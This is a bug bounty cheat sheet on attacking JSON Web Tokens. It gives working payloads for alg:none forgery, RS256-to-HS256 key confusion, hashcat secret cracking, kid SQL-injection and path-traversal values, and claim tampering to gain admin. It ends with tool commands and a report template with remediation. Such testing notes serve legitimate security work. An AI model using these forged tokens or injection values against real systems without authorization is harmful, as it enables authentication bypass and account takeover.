# JWT Token Attacks

> **OWASP:** A02:2021 — Broken Authentication  
> **Severity:** High → Critical (auth bypass = Critical)  
> **Quick check:** Decode at jwt.io — read every claim, test every attack

---

## What is JWT?

JSON Web Token — three base64-encoded parts separated by dots:
```
header.payload.signature

eyJhbGciOiJIUzI1NiJ9  .  eyJzdWIiOiJ1c2VyMSIsInJvbGUiOiJ1c2VyIn0  .  abc123sig
     header                          payload                              signature
```
Anyone can decode the header and payload. The signature proves it wasn't tampered with — **if the server actually verifies it.**

---

## 6 JWT Attacks

### 01 · Algorithm: None Attack (Critical)
```python
# Change alg to "none" — server skips verification

# Original header
{"alg": "HS256", "typ": "JWT"}

# Attack header
{"alg": "none", "typ": "JWT"}

# Construct token:
import base64, json

header  = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b'=')
payload = base64.urlsafe_b64encode(b'{"sub":"admin","role":"admin"}').rstrip(b'=')
token   = header + b'.' + payload + b'.'   # empty signature!

# Also try: "None", "NONE", "nOnE" — case variations
```

### 02 · RS256 → HS256 Algorithm Confusion (Critical)
```
How it works:
- RS256: asymmetric — signed with PRIVATE key, verified with PUBLIC key
- HS256: symmetric — same key for signing and verifying

Attack:
1. Get server's PUBLIC key (often at /.well-known/jwks.json)
2. Change token header: "alg": "RS256" → "alg": "HS256"
3. Sign token using the PUBLIC key as HMAC secret
4. Server verifies HS256 with its "public key" (same key you used!)

Result: Valid token — server thinks you signed it legitimately

Tools:
- jwt_tool: python3 jwt_tool.py TOKEN -X k -pk public.pem
```

### 03 · Weak Secret Brute Force (High)
```bash
# Crack HMAC secret with hashcat
hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt

# Or with john
john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 token.jwt

# Once cracked — forge any token:
import jwt
forged = jwt.encode({"sub": "admin", "role": "admin"}, "cracked_secret", algorithm="HS256")

# Common weak secrets to try manually:
# secret, password, 123456, jwt_secret, your-256-bit-secret
```

### 04 · JWT Header Injection (kid) (High)
```
kid = Key ID — header param that tells server which key to use

SQL Injection via kid:
{"kid": "' UNION SELECT 'attacker_secret' -- "}
→ Server queries DB for key → returns attacker's value
→ Sign token with "attacker_secret" → valid!

Path Traversal via kid:
{"kid": "../../dev/null"}
→ Server reads /dev/null → empty string as key
→ Sign token with empty string "" → valid!

{"kid": "../../proc/sys/kernel/randomize_va_space"}
→ Predictable file content as key → crackable
```

### 05 · Expired Token Accepted (Medium)
```
Test if server validates the exp (expiration) claim:

1. Decode your JWT
2. Change exp to Unix timestamp in the past:
   "exp": 1000000000   (already expired in 2001!)
3. Re-sign (or try without resigning if alg=none works)
4. Submit — does server reject with 401? Or accept anyway?

If accepted = server never validates expiration
→ Stolen tokens work indefinitely after theft
```

### 06 · Privilege Escalation via Claims (High)
```json
// Original payload
{"sub": "user123", "role": "user", "admin": false}

// Modified payload — change role + admin flag
{"sub": "user123", "role": "admin", "admin": true}

// Test if server:
// 1. Accepts modified claims (signature not verified)
// 2. Uses role claim for authorization decisions
// 3. Trusts client-side admin flag

// Also test:
// "scope": "read write admin"
// "permissions": ["admin:read", "admin:write"]
// "groups": ["admins"]
```

---

## JWT Structure Cheatsheet

```
Header claims to check:
- alg: signature algorithm (target for attacks)
- kid: key ID (injectable)
- jku: JWK Set URL (SSRF via jwks fetch)
- x5u: X.509 cert URL (SSRF)

Payload claims to check:
- sub: subject (user ID — try changing to other users)
- role/admin/scope: authorization claims
- exp: expiration (test if validated)
- iat: issued at (test if validated)
- aud: audience (test if validated)
```

---

## Checklist

```
☐  Decode JWT at jwt.io — read header + payload claims
☐  Try alg=none — remove signature, set alg none
☐  Run hashcat -m 16500 on token with rockyou.txt
☐  Test RS256→HS256 confusion with server's public key
☐  Modify exp to past date — does server reject expired tokens?
☐  Change role/admin claims — does server re-verify?
☐  Check kid / jku / x5u headers for injection points
☐  Look for JWKS endpoint: /.well-known/jwks.json
```

---

## Tools

```bash
# jwt_tool — Swiss army knife for JWT attacks
git clone https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py TOKEN -T          # tamper mode
python3 jwt_tool.py TOKEN -X a        # alg:none attack
python3 jwt_tool.py TOKEN -X k -pk pk.pem  # key confusion

# hashcat — brute force HMAC secret
hashcat -a 0 -m 16500 token.jwt wordlist.txt

# jwt.io — decode and inspect
https://jwt.io
```

---

## Report Template

```
Title: JWT Algorithm None Attack — Authentication Bypass

Severity: Critical (CVSS 9.8)

Endpoint: GET /api/user/profile (Authorization: Bearer TOKEN)

Steps to Reproduce:
1. Obtain any valid JWT token (even expired)
2. Decode header: {"alg":"HS256","typ":"JWT"}
3. Change to:     {"alg":"none","typ":"JWT"}
4. Modify payload: {"sub":"admin","role":"admin"}
5. Remove signature (keep trailing dot): header.payload.
6. Submit request with modified token
7. Response: 200 OK with admin user data

Impact:
Full authentication bypass — any user can forge tokens
for any account including admin. No credentials required.

Remediation:
- Explicitly whitelist allowed algorithms (reject "none")
- Use a JWT library that rejects alg:none by default
- Validate algorithm against server-side expected value
```

---

*Daily Bug Bounty notes — follow for more.*
